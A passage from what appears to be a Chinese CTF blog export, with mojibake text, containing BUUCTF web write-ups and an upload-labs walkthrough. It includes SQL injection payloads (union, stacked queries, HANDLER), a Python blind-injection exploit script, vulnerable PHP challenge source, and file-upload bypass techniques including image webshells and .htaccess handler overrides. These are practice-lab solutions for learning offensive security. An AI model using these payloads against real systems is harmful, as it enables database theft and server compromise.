&#x27;$name&#x27;</span><br></pre></td></tr></table></figure><p>å°è¯•åå‘ç°<code>(</code>ã€<code>)</code>ã€<code>or</code>å’Œ<code>=</code>è¢«ç¦ç”¨ï¼Œæ„é€ postè¯·æ±‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#url</span><br><span class="line">http://e4108c0f-ff96-443a-943e-fe487fdd84a4.node4.buuoj.cn:81/search.php</span><br><span class="line">#data</span><br><span class="line">name=a&#x27;union select &#x27;1&#x27;,&#x27;admin&#x27;,&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;%23&amp;pw=3</span><br></pre></td></tr></table></figure><blockquote><p>åˆ©ç”¨sqliçš„ç‰¹æ€§ï¼šåœ¨è”åˆæŸ¥è¯¢å¹¶ä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œè”åˆæŸ¥è¯¢å°±ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®ã€‚</p></blockquote><p>é¢˜ç›®æºç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;Do you know who am I?&lt;/title&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">require &quot;config.php&quot;;</span><br><span class="line">require &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">// å»é™¤è½¬ä¹‰</span><br><span class="line">if (get_magic_quotes_gpc()) &#123;</span><br><span class="line">function stripslashes_deep($value)</span><br><span class="line">&#123;</span><br><span class="line">$value = is_array($value) ?</span><br><span class="line">array_map(&#x27;stripslashes_deep&#x27;, $value) :</span><br><span class="line">stripslashes($value);</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST = array_map(&#x27;stripslashes_deep&#x27;, $_POST);</span><br><span class="line">$_GET = array_map(&#x27;stripslashes_deep&#x27;, $_GET);</span><br><span class="line">$_COOKIE = array_map(&#x27;stripslashes_deep&#x27;, $_COOKIE);</span><br><span class="line">$_REQUEST = array_map(&#x27;stripslashes_deep&#x27;, $_REQUEST);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);</span><br><span class="line">$name = $_POST[&#x27;name&#x27;];</span><br><span class="line">$password = $_POST[&#x27;pw&#x27;];</span><br><span class="line">$t_pw = md5($password);</span><br><span class="line">$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;</span><br><span class="line">// echo $sql;</span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;/\(|\)|\=|or/&quot;, $name))&#123;</span><br><span class="line">die(&quot;do not hack me!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">if (!$result) &#123;</span><br><span class="line">printf(&quot;Error: %s\n&quot;, mysqli_error($con));</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">// echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class="line">$arr = mysqli_fetch_row($result);</span><br><span class="line">// print_r($arr);</span><br><span class="line">if($arr[1] == &quot;admin&quot;)&#123;</span><br><span class="line">if(md5($password) == $arr[2])&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">die(&quot;wrong pass!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">die(&quot;wrong user!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/m0_46246804/article/details/109128549">[GXYCTF2019]BabySQli è§£é¢˜æ€è·¯&amp;è¿‡ç¨‹</a></p><p><a href="https://blog.csdn.net/satasun/article/details/107180524">[GXYCTF2019]BabySQli</a></p></blockquote><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>å°è¯•æ³¨å…¥åå‘ç°æœ‰æŠ¥é”™ï¼Œç¦ç”¨äº†ä¸€äº›å…³é”®è¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure><p>è¿›è¡Œæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#çˆ†å‡ºæ•°æ®åº“åsupersqli</span><br><span class="line">/?inject=1&#x27;and extractvalue(1,concat(0x7e,database()))%23</span><br><span class="line">#çˆ†è¡¨åFlagHere,words</span><br><span class="line">/?inject=-1&#x27;;show tables;%23</span><br><span class="line">#çˆ†åˆ—ï¼ˆå‘ç°æœ‰åç§°flagï¼‰</span><br><span class="line">/?inject=-1&#x27;;show columns from FlagHere;%23</span><br><span class="line">#è·å–flag</span><br><span class="line">/?inject=-1&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;%23</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_52268949/article/details/122707006">[GYCTF2020]Blacklist</a></p></blockquote><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>é‡‡ç”¨<code>.htaccessç»•è¿‡</code>å³å¯ï¼Œå‚è€ƒæœ¬äººåšå®¢<a href="https://www.evo1ution.cn/2022/05/27/upload-labs/">upload-labs</a>ä¸­<code>pass-04</code>å³å¯ä¸Šä¼ æˆåŠŸã€‚ä¸Šä¼ åç”¨èšå‰‘è¿æ¥ï¼Œåœ¨æ ¹ç›®å½•ä¸‹å³å¯æ‰¾åˆ°flagã€‚</p><blockquote><p>æ³¨æ„ï¼šè¿æ¥æ—¶æ‰¾å‡†ä¸¤ä¸ªæ–‡ä»¶æ‰€åœ¨åŒä¸€ç›®å½•</p></blockquote><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>ç›²æ³¨ï¼Œ<code>exp</code>å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://6b9ef1c1-f0eb-4837-968c-06daba8e0f0c.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span> : <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    l = <span class="number">33</span></span><br><span class="line">    r = <span class="number">130</span></span><br><span class="line">    mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(l&lt;r):</span><br><span class="line">        <span class="comment"># print(l,r,mid)</span></span><br><span class="line">        payload[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;0^&quot;</span> + <span class="string">&quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)  <span class="comment">#ä¸è®¾ç½®å»¶æ—¶ä¼šæ— æ³•å¾—åˆ°æ­£ç¡®flag</span></span><br><span class="line">        response = requests.post(url,data=payload)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            l = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">    res += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="keyword">if</span>(res[-<span class="number">1</span>]==<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><blockquote><p>**if(1&#x3D;1,1,2)**ï¼šç±»ä¼¼ä¸‰ç›®è¿ç®—ç¬¦<code>1==1?1:2</code></p><p><strong>0^1</strong>ï¼šå¼‚æˆ–</p></blockquote><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbuser</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">#è¢«è¿‡æ»¤çš„å†…å®¹ å‡½æ•°åŸºæœ¬æ²¡è¿‡æ»¤</span></span><br><span class="line">    <span class="variable">$blackList</span> = <span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;||&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&#x27;group&#x27;</span>,<span class="string">&#x27;limit&#x27;</span>,<span class="string">&#x27;update&#x27;</span>,<span class="string">&#x27;delete&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;load_file&#x27;</span>,<span class="string">&#x27;outfile&#x27;</span>,<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blackList</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$sql</span>,<span class="variable">$blackitem</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$db</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;   </span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&quot;ctf&quot;</span>,<span class="variable">$db</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">safe</span>(<span class="variable">$id</span>))&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$query</span>)&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$query</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Error Occured When Fetch Result.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$query</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;SQL Injection Checked.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs åˆ·é¢˜è®°å½•</title>
      <link href="/2022/05/27/upload-labs/"/>
      <url>/2022/05/27/upload-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-labs-åˆ·é¢˜è®°å½•"><a href="#upload-labs-åˆ·é¢˜è®°å½•" class="headerlink" title="upload-labs åˆ·é¢˜è®°å½•"></a>upload-labs åˆ·é¢˜è®°å½•</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://mh-nexus.de/en/hxd/">HxD</a></p><p><a href="https://xz.aliyun.com/t/2657#toc-13">upload-labsä¹‹pass 16è¯¦ç»†åˆ†æ</a></p><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labsé€šå…³æ”»ç•¥</a></p></blockquote><h2 id="Pass-01-jsæ£€æŸ¥"><a href="#Pass-01-jsæ£€æŸ¥" class="headerlink" title="Pass-01 jsæ£€æŸ¥"></a>Pass-01 jsæ£€æŸ¥</h2><p>å‰ç«¯éªŒè¯å›¾ç‰‡æ ¼å¼ï¼Œç¦ç”¨<code>js</code>æˆ–è€…ä½¿ç”¨<code>burp</code>æŠ“åŒ…ä¿®æ”¹åç¼€å³å¯ã€‚</p><p><img src="https://img.gejiba.com/images/be4d8b59f055d5ad042387525c54bfa2.png" alt="be4d8b59f055d5ad042387525c54bfa2.png"></p><p>è®¿é—®<code>http://127.0.0.1:8081/upload-labs/upload/phpinfo.php</code>å³å¯æŸ¥çœ‹ä¿¡æ¯ã€‚</p><h2 id="Pass-02-åªéªŒè¯content-type"><a href="#Pass-02-åªéªŒè¯content-type" class="headerlink" title="Pass-02 åªéªŒè¯content-type"></a>Pass-02 åªéªŒè¯content-type</h2><p>åªéªŒè¯äº†<code>content-type</code>ç±»å‹ï¼ŒæŠ“åŒ…ä¿®æ”¹å³å¯</p><p><img src="https://img.gejiba.com/images/3bf4033c5b0d71b5c70903f7e787b8bb.png" alt="3bf4033c5b0d71b5c70903f7e787b8bb.png"></p><h2 id="Pass-03-é»‘åå•ç»•è¿‡"><a href="#Pass-03-é»‘åå•ç»•è¿‡" class="headerlink" title="Pass-03 é»‘åå•ç»•è¿‡"></a>Pass-03 é»‘åå•ç»•è¿‡</h2><p>é‡‡ç”¨é»‘åå•æœºåˆ¶ï¼Œä¸å…è®¸ä¸Šä¼ <code>.asp,.aspx,.php,.jsp</code>åç¼€çš„æ–‡ä»¶ï¼Œä½†å¯ä»¥ä¸Šä¼ <code>.phtml .phps .php5 .pht</code>ï¼Œå‰ææ˜¯<code>apache</code>çš„<code>httpd.conf</code>ä¸­æœ‰å¦‚ä¸‹é…ç½®ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åæ³¨æ„å…³æ³¨ä¸‹æ–‡ä»¶å­˜å‚¨ä½ç½®å’Œæ–‡ä»¶å</p><p><img src="https://img.gejiba.com/images/dc38b78d98fa42a507712c6e224bae50.png" alt="dc38b78d98fa42a507712c6e224bae50.png"></p><h2 id="Pass-04-htaccessç»•è¿‡"><a href="#Pass-04-htaccessç»•è¿‡" class="headerlink" title="Pass-04 .htaccessç»•è¿‡"></a>Pass-04 .htaccessç»•è¿‡</h2><p>ç¦æ­¢äº†ä¸€ç³»åˆ—æ–‡ä»¶ç±»å‹ï¼Œä½†æ²¡æœ‰ç¦æ­¢<code>.htaccess</code>ï¼Œä¸è¿‡è¯¥æ–¹æ³•éœ€è¦<code>mod_rewrite</code>æ¨¡å—å¼€å¯ä¸”<code>AllowOverride All</code>ã€‚</p><p>ä¸Šä¼ ä¸€ä¸ª<code>.htaccess</code>æ–‡ä»¶ï¼Œå†…å®¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p><img src="https://img.gejiba.com/images/ba4a58067b6876052721825a87ac6fa2.png" alt="ba4a58067b6876052721825a87ac6fa2.png"></p><p>è¿™æ ·æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šå½“æˆphpæ–‡ä»¶æ¥è§£æï¼Œæ‰€ä»¥æ­¤æ—¶å†ä¸Šä¼ <code>phpinfo.jpg</code>å¹¶è®¿é—®å³å¯ã€‚</p><h2 id="Pass-05-ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡"><a href="#Pass-05-ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡" class="headerlink" title="Pass-05 ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡"></a>Pass-05 ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡</h2><p>åç¼€ä¿®æ”¹ä¸º<code>.php. .</code></p><h2 id="Pass-06-å¤§å°å†™ç»•è¿‡"><a href="#Pass-06-å¤§å°å†™ç»•è¿‡" class="headerlink" title="Pass-06 å¤§å°å†™ç»•è¿‡"></a>Pass-06 å¤§å°å†™ç»•è¿‡</h2><p>ä¿®æ”¹æ–‡ä»¶åç¼€ä¸º<code>.PHP</code>å³å¯</p><h2 id="Pass-07-ç©ºæ ¼ç»•è¿‡"><a href="#Pass-07-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="Pass-07 ç©ºæ ¼ç»•è¿‡"></a>Pass-07 ç©ºæ ¼ç»•è¿‡</h2><p>åç¼€æœ€ååŠ ç©ºæ ¼å³å¯</p><h2 id="Pass-08-ç‚¹ç»•è¿‡"><a href="#Pass-08-ç‚¹ç»•è¿‡" class="headerlink" title="Pass-08 ç‚¹ç»•è¿‡"></a>Pass-08 ç‚¹ç»•è¿‡</h2><p>åç¼€åŠ ç‚¹å³å¯<code>.php.</code></p><h2 id="Pass-09-DATAç»•è¿‡"><a href="#Pass-09-DATAç»•è¿‡" class="headerlink" title="Pass-09 ::$DATAç»•è¿‡"></a>Pass-09 ::$DATAç»•è¿‡</h2><p>åœ¨åç¼€åŠ <code>::$DATA</code>å³å¯</p><h2 id="Pass-10-ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡"><a href="#Pass-10-ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡" class="headerlink" title="Pass-10 ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡"></a>Pass-10 ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡</h2><p>åŒ<code>Pass-05</code></p><h2 id="Pass-11-åŒå†™ç»•è¿‡"><a href="#Pass-11-åŒå†™ç»•è¿‡" class="headerlink" title="Pass-11 åŒå†™ç»•è¿‡"></a>Pass-11 åŒå†™ç»•è¿‡</h2><p>åç¼€æ”¹ä¸º<code>.pphphp</code></p><h2 id="Pass-12-00æˆªæ–­"><a href="#Pass-12-00æˆªæ–­" class="headerlink" title="Pass-12 %00æˆªæ–­"></a>Pass-12 %00æˆªæ–­</h2><p>æŠ“åŒ…ä¿®æ”¹<code>save_path</code>å‚æ•°</p><blockquote><p>phpç‰ˆæœ¬è¦å°äº5.3.4ä¸”magic_quotes_gpcä¸ºOFFçŠ¶æ€</p></blockquote><h2 id="Pass-13-0x00æˆªæ–­"><a href="#Pass-13-0x00æˆªæ–­" class="headerlink" title="Pass-13 0x00æˆªæ–­"></a>Pass-13 0x00æˆªæ–­</h2><p>åŒ<code>Pass-12</code>ï¼Œåªä¸è¿‡è¿™é‡Œè·¯å¾„æ˜¯POSTè¯·æ±‚ï¼Œæ‰€ä»¥è¦æŠ“åŒ…åä¿®æ”¹Hex</p><h2 id="Pass-14-æ–‡ä»¶å¤´æ£€æµ‹"><a href="#Pass-14-æ–‡ä»¶å¤´æ£€æµ‹" class="headerlink" title="Pass-14 æ–‡ä»¶å¤´æ£€æµ‹"></a>Pass-14 æ–‡ä»¶å¤´æ£€æµ‹</h2><p>å¯ä»¥ç›´æ¥ç”¨<code>copy 14.jpg /b + 14.php /a webshell.jpg</code>ç”Ÿæˆå›¾ç‰‡é©¬ï¼Œç„¶åç›´æ¥ä¸Šä¼ ã€‚</p><p>ä¸Šä¼ åä½¿ç”¨è‡ªå¸¦çš„<code>include.php</code>è¯»å–å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/upload-labs/include.php?file=./upload/6220220527081735.png</span><br></pre></td></tr></table></figure><h2 id="Pass-15-getimagesizeæ£€æµ‹"><a href="#Pass-15-getimagesizeæ£€æµ‹" class="headerlink" title="Pass-15 getimagesizeæ£€æµ‹"></a>Pass-15 getimagesizeæ£€æµ‹</h2><p>åŒ<code>Pass-14</code></p><blockquote><p>getimagesizeå‡½æ•°ï¼šå¯¹ç›®æ ‡æ–‡ä»¶çš„16è¿›åˆ¶å»è¿›è¡Œä¸€ä¸ªè¯»å–ï¼Œå»è¯»å–å¤´å‡ ä¸ªå­—ç¬¦ä¸²æ˜¯ä¸æ˜¯ç¬¦åˆå›¾ç‰‡çš„è¦æ±‚çš„</p></blockquote><h2 id="Pass-16-exif-imagetypeæ£€æµ‹"><a href="#Pass-16-exif-imagetypeæ£€æµ‹" class="headerlink" title="Pass-16 exif_imagetypeæ£€æµ‹"></a>Pass-16 exif_imagetypeæ£€æµ‹</h2><p>åŒ<code>Pass14</code>ï¼Œä½†è¦æ‰“å¼€<code>php_exif</code></p><blockquote><p>exif_imagetypeå‡½æ•°ï¼šè¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾å</p></blockquote><h2 id="Pass-17-äºŒæ¬¡æ¸²æŸ“"><a href="#Pass-17-äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="Pass-17 äºŒæ¬¡æ¸²æŸ“"></a>Pass-17 äºŒæ¬¡æ¸²æŸ“</h2><p>ç”¨<a href="https://mh-nexus.de/en/hxd/">HxD</a>æŸ¥çœ‹ä¸Šä¼ å‰åæ–‡ä»¶å·®å¼‚ï¼Œçœ‹çœ‹å“ªä¸ªéƒ¨åˆ†æ²¡æœ‰è¢«ä¿®æ”¹ï¼Œå°†phpä»£ç æ”¾åˆ°æ²¡æœ‰è¢«æ›´æ”¹çš„éƒ¨åˆ†å³å¯ã€‚</p><p>è¯¦ç»†æ“ä½œå¯è§<a href="https://xz.aliyun.com/t/2657#toc-13">upload-labsä¹‹pass 16è¯¦ç»†åˆ†æ</a></p><blockquote><p>imagecreatefromjpegå‡½æ•°ï¼šç”¨äºä»JPEGæ–‡ä»¶æˆ–URLåˆ›å»ºæ–°å›¾åƒï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­å¯èƒ½ä¼šæœ‰ä¿¡æ¯ä¸¢å¤±ï¼ˆå¦‚æ¤å…¥çš„phpä»£ç ï¼‰</p></blockquote><h2 id="Pass-18-æ¡ä»¶ç«äº‰"><a href="#Pass-18-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass-18 æ¡ä»¶ç«äº‰"></a>Pass-18 æ¡ä»¶ç«äº‰</h2><p>å®¡è®¡æºç ï¼Œå‘ç°åç«¯æ˜¯å…ˆå°†å›¾ç‰‡ä¸Šä¼ ä¸Šå»ï¼Œæ‰å¼€å§‹è¿›è¡Œåˆ¤æ–­åç¼€åã€äºŒæ¬¡æ¸²æŸ“ã€‚å¦‚æœæˆ‘ä»¬åœ¨ä¸Šä¼ åä½†æœªéªŒè¯çš„è¿™ä¸€ç¬é—´è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£ä»–å°±ä¸èƒ½å¯¹è¿™ä¸ªæ–‡ä»¶åˆ é™¤ã€äºŒæ¬¡æ¸²æŸ“ã€‚</p><p>ç”¨<code>burp</code>çš„<code>intruder</code>æ¨¡å—ä¸åœå‘é€è¯·æ±‚ï¼Œç„¶åä¸æ–­åˆ·æ–°é¡µé¢è®¿é—®ç›´åˆ°æˆåŠŸã€‚</p><h2 id="Pass-19-åç¼€åˆ¤æ–­-äºŒæ¬¡æ¸²æŸ“-æ¡ä»¶ç«äº‰"><a href="#Pass-19-åç¼€åˆ¤æ–­-äºŒæ¬¡æ¸²æŸ“-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass-19 åç¼€åˆ¤æ–­+äºŒæ¬¡æ¸²æŸ“+æ¡ä»¶ç«äº‰"></a>Pass-19 åç¼€åˆ¤æ–­+äºŒæ¬¡æ¸²æŸ“+æ¡ä»¶ç«äº‰</h2><p>ä¸Šä¼ å›¾ç‰‡é©¬é…åˆæ–‡ä»¶åŒ…å«æ¼æ´å³å¯ï¼Œå…¶ä»–åŒ<code>Pass-18</code>ã€‚</p><h2 id="Pass-20-x2F-ç»•è¿‡"><a href="#Pass-20-x2F-ç»•è¿‡" class="headerlink" title="Pass-20 &#x2F;.ç»•è¿‡"></a>Pass-20 &#x2F;.ç»•è¿‡</h2><p><img src="https://img.gejiba.com/images/8b13cd552ce4213d4e01abcd454d87cc.png" alt="8b13cd552ce4213d4e01abcd454d87cc.png"></p><blockquote><p>move_uploaded_file()ç‰¹æ€§ä¹‹ä¸€ï¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„ &#x2F;.</p></blockquote><h2 id="Pass-21-æ•°ç»„ç»•è¿‡"><a href="#Pass-21-æ•°ç»„ç»•è¿‡" class="headerlink" title="Pass-21 æ•°ç»„ç»•è¿‡"></a>Pass-21 æ•°ç»„ç»•è¿‡</h2><p><img src="https://img.gejiba.com/images/ac64dfb6954cf795497815163ebe8c23.png" alt="ac64dfb6954cf795497815163ebe8c23.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs åˆ·é¢˜è®°å½•</title>
      <link href="/2022/05/17/sqli-labs/"/>
      <url>/2022/05/17/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-åˆ·é¢˜è®°å½•"><a href="#sqli-labs-åˆ·é¢˜è®°å½•" class="headerlink" title="sqli-labs åˆ·é¢˜è®°å½•"></a>sqli-labs åˆ·é¢˜è®°å½•</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/lcamry/category/846064.html">MYSQLæ³¨å…¥å¤©ä¹¦</a></p></blockquote><p>æ­¤æ–‡å°½é‡ä½¿ç”¨æ‰‹å·¥æ³¨å…¥ä»¥åŠ æ·±å¯¹åŸç†çš„ç†è§£ï¼Œç«­åŠ›é¿å…äº†ä½¿ç”¨sqlmapæˆ–è€…è„šæœ¬è‡ªåŠ¨åŒ–æ³¨å…¥ç­‰æ–¹å¼ã€‚</p><h2 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1 (Basic Challenges)"></a>Page-1 (Basic Challenges)</h2><h3 id="Less-1-GET-Error-based-Single-quotes-String-åŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-1-GET-Error-based-Single-quotes-String-åŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-1 GET - Error based - Single quotes - String (åŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥)"></a>Less-1 GET - Error based - Single quotes - String (åŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥"><a href="#æ‰‹åŠ¨æ³¨å…¥" class="headerlink" 